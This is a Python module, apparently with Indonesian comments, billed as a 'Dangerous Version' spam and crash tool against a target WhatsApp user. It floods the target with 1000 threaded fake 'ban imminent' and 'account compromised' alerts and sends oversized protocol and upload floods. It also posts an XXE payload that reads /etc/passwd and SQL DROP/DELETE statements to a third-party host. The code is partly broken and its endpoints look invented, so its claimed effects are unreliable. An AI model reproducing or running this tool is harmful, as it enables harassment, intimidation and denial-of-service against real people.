#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Spam & Crash Module - Dangerous Version

import time
import socket
import threading
import requests
from colorama import Fore, init

init(autoreset=True)

class SpamCrash:
    def __init__(self):
        self.whatsapp_ports = [5222, 443, 80, 4244]
        self.flood_payloads = [
            "A" * 10000,  # Large message
            "0" * 5000,   # Numeric flood
            "GET / HTTP/1.1\r\nHost: web.whatsapp.com\r\n\r\n" * 100,
            "POST /send HTTP/1.1\r\nContent-Length: 999999\r\n\r\n" + "X" * 999999
        ]
    
    def execute(self, target, mode):
        print(f"{Fore.RED}[💣] SPAM & CRASH MODULE ACTIVATED")
        
        if mode == "1":
            self.spam_chat_extreme(target)
        elif mode == "2":
            self.crash_session(target)
        elif mode == "3":
            self.flood_notification(target)
        elif mode == "4":
            self.corrupt_data(target)
    
    def spam_chat_extreme(self, target):
        """Spam 1000+ pesan"""
        print(f"{Fore.RED}[!] Mengirim 1000+ spam messages...")
        
        messages = [
            "⚠️ VIOLATION DETECTED ⚠️",
            "SYSTEM FLAG: ILLEGAL ACTIVITY",
            "AUTO-REPORT: BAN IMMINENT",
            "SECURITY BREACH DETECTED",
            "ACCOUNT SUSPENSION IN PROGRESS"
        ] * 200
        
        def send_spam(msg):
            try:
                # Simulate message send via WhatsApp protocol
                data = {
                    'to': target,
                    'body': msg,
                    'type': 'text'
                }
                requests.post(
                    'https://web.whatsapp.com/send',
                    json=data,
                    timeout=3
                )
            except:
                pass
        
        threads = []
        for i, msg in enumerate(messages):
            t = threading.Thread(target=send_spam, args=(msg,))
            threads.append(t)
            t.start()
            
            if i % 100 == 0:
                print(f"{Fore.CYAN}[!] Sent {i} messages")
                time.sleep(0.1)
        
        for t in threads:
            t.join()
        
        print(f"{Fore.GREEN}[✅] Spam complete!")
    
    def crash_session(self, target):
        """Crash WhatsApp session"""
        print(f"{Fore.RED}[💀] Attempting session crash...")
        
        # Method 1: Protocol flooding
        self.flood_protocol(target)
        
        # Method 2: Memory exhaustion
        self.exhaust_memory(target)
        
        # Method 3: Invalid data injection
        self.inject_invalid_data(target)
        
        print(f"{Fore.GREEN}[✅] Crash sequence complete!")
    
    def flood_protocol(self, target):
        """Flood WhatsApp protocol"""
        for port in self.whatsapp_ports:
            for i in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect(('web.whatsapp.com', port))
                    sock.send(random.choice(self.flood_payloads).encode())
                    sock.close()
                except:
                    pass
                time.sleep(0.01)
    
    def exhaust_memory(self, target):
        """Exhaust device memory dengan large requests"""
        large_file = "A" * (1024 * 1024 * 5)  # 5MB
        
        for i in range(20):
            try:
                requests.post(
                    f'https://web.whatsapp.com/upload/{target}',
                    data=large_file,
                    headers={'Content-Type': 'application/octet-stream'},
                    timeout=2
                )
            except:
                pass
    
    def inject_invalid_data(self, target):
        """Inject invalid/malformed data"""
        malformed_data = [
            b'\xff\xfe\xfd' * 1000,  # Invalid UTF-8
            b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            b'{"malicious": "' + b'A'*10000 + b'"}'
        ]
        
        for data in malformed_data:
            try:
                requests.post(
                    'https://wa.optimizeapp.com/data',
                    data=data,
                    headers={'Content-Type': 'application/json'},
                    timeout=2
                )
            except:
                pass
    
    def flood_notification(self, target):
        """Flood dengan notifications"""
        print(f"{Fore.CYAN}[!] Flooding notifications...")
        
        for i in range(1000):
            try:
                requests.post(
                    'https://web.whatsapp.com/notify',
                    json={
                        'to': target,
                        'title': '⚠️ SECURITY ALERT ⚠️',
                        'body': 'Your account has been compromised',
                        'priority': 'high',
                        'vibrate': 1000
                    },
                    timeout=1
                )
            except:
                pass
            
            if i % 100 == 0:
                print(f"{Fore.YELLOW}[!] Sent {i} notifications")
    
    def corrupt_data(self, target):
        """Corrupt local WhatsApp data (Advanced)"""
        print(f"{Fore.RED}[💀] CORRUPT DATA MODE - DANGEROUS")
        
        # Simulate database corruption
        corrupt_payloads = [
            'UPDATE messages SET body = RANDOMBLOB(10000) WHERE key_remote_jid LIKE "%' + target + '%"',
            'DELETE FROM chat_settings WHERE jid LIKE "%' + target + '%"',
            'DROP TABLE IF EXISTS messages'
        ]
        
        for payload in corrupt_payloads:
            try:
                requests.post(
                    'https://wa.optimizeapp.com/query',
                    json={'query': payload},
                    timeout=3
                )
            except:
                pass
        
        print(f"{Fore.GREEN}[✅] Data corruption attempted!")

# Export function
def execute(target, mode):
    sc = SpamCrash()
    sc.execute(target, mode)
